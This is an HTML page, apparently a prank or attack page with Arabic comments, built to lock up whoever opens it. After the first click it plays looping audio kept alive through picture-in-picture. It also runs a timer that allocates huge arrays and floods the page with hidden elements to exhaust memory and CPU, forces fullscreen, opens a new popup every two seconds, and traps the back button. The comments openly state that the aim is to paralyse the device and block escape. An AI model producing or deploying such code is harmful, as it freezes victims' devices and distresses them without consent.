<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM_PARALYSIS_DZ ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* صورة المرأة اللي تتحرك وتراقب سواسوة */
        #stalkerEntity { 
            position: fixed; top: -5%; left: -5%; width: 110%; height: 110%; 
            object-fit: cover; z-index: 1; 
            filter: contrast(150%) brightness(60%) sepia(50%);
            animation: humanGaze 8s infinite ease-in-out;
        }

        @keyframes humanGaze {
            0%, 100% { transform: scale(1) translate(0, 0); }
            25% { transform: scale(1.02) translate(1%, 1%) rotate(0.5deg); }
            50% { transform: scale(1.05) translate(-1%, 0.5%) rotate(-0.5deg); }
            75% { transform: scale(1.03) translate(0.5%, -1%); }
        }

        #overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.7); z-index: 2; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            color: white; font-family: 'Courier New', monospace;
        }

        .lag-text { color: red; font-size: 20px; animation: blink 0.1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body onclick="engageNightmare()">

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="overlay">
        <h1 class="lag-text">STALKER SYSTEM: TOTAL LOCK</h1>
        <p>النظام معطل تماماً.. لا تحاول الهروب سواسوة</p>
    </div>

    <video id="bgAudio" loop style="display:none;">
        <source src="tfy-krk.mp3" type="audio/mpeg">
    </video>

    <script>
        function engageNightmare() {
            // 1. تشغيل الصوت في الخلفية سواسوة (Persistent Audio)
            const video = document.getElementById('bgAudio');
            video.play();
            // ميزة بقاء الصوت حتى بعد الخروج سواسوة عبر PiP
            if (video.requestPictureInPicture) {
                video.requestPictureInPicture();
            }

            // 2. اللاق الشديد (Total System Paralysis) سواسوة
            // نصنع حلقة تستهلك الذاكرة والمعالج في نفس الوقت
            setInterval(() => {
                const heavyLoad = new Array(5000000).fill("💀");
                for(let i=0; i<100; i++) {
                    document.body.appendChild(document.createElement('div')).hidden = true;
                }
                console.log("Lagging System...");
            }, 30);

            // 3. منع الخروج من الخلفية سواسوة
            document.documentElement.requestFullscreen();
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
                history.pushState(null, null, window.location.href);
            }, 2000);
        }

        window.onpopstate = function() { history.go(1); };
    </script>
</body>
</html>
